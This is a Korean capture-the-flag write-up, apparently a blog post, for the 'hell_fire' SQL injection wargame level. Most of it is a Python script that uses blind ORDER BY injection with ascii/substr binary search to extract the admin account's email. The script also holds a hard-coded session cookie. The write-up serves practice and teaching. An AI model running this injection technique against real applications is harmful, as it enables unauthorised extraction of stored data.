---
title: LOS - 23번 hell_fire
category: Lord of SQL Injection
---

# [23] hell_fire

## 문제
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F5eUFD%2FbtrnVrPFyVL%2FKNGuBlPtjreZyWkhE4l4uk%2Fimg.png">

## 풀이

**LoS 23번 Python 자동화 코드**이다.

```python
import requests

def send(param):
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
    cookie = "sdrjk57hqa404dvtb3akcpfvk1"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 23을 시작합니다")

for num in range(0,100):
    param=f"?order=if(id='admin' and length(email)={num}, 'id', 'score')"
    if("200</td></tr><tr><td>rubiya" in send(param)):
        print(f"👏 email의 길이는 {num}입니다!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?order=if(id='admin' and ascii(substr(email,{len},1))>={middle}, 'id', 'score') %23"
        if("200</td></tr><tr><td>rubiya" in send(param)):
            param=f"?order=if(id='admin' and ascii(substr(email,{len},1))={middle}, 'id', 'score') %23"
            if("200</td></tr><tr><td>rubiya" in send(param)):
                print(f"{len}번째 문자 → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"👏 email의 정체는 [{ans}]입니다!")
```

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FODAqj%2FbtrnX0KUmP3%2FEyAtalWB84Fusk5ABdVFM0%2Fimg.png">

admin 계정의 email은 `admin_secure_email@emai1.com` 임을 확인할 수 있다.

* @ 뒷부분을 보면... emai**1** 이다. 깨알같은 함정?

## 결과
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FboRpmQ%2Fbtrn14rH98w%2FwhuKJ6XRowVM23QGkUPvIK%2Fimg.png">